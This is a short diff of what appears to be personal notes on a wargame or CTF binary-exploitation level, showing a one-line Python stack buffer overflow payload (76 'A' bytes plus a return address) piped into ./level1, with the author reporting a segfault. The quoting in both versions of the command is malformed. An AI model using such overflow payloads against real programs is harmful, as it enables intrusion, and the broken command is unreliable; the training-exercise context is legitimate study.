@@ -32,6 +32,6 @@ All seems be the same, just ask for input from stdin
 
 // I made my script
 
-~$ python -c 'print "A"*76"+"\x44\x84\x04\x08"' | ./level1
+~$ python -c 'print "A*"76"+"\x44\x84\x04\x08"' | ./level1
 
 // I got some output but also a SIGSEGV (test with via ssh that, could be the limitated condition of the machine ?!?!)
